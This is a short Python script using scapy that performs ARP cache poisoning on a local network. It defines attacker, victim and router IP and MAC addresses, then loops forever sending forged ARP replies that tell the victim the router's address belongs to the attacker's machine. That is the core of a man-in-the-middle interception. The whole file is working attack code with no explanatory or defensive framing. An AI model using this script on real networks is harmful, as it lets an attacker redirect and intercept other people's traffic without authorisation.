from scapy.all import ARP, send

my_ip = "192.168.1.161"
my_mac = "70-D8-23-4E-B1-FE"

victim_ip = "192.168.1.145"
victim_mac = "9a-cd-7e-d0-0b-6d"

router_ip = "192.168.1.1"
router_mac = "20-b0-01-36-b4-a0"

while True:
    victim_packet = ARP(op = 2, psrc = router_ip, hwsrc = my_mac, pdst = victim_ip, hwdst = victim_mac)
    print(victim_packet)
    send(victim_packet)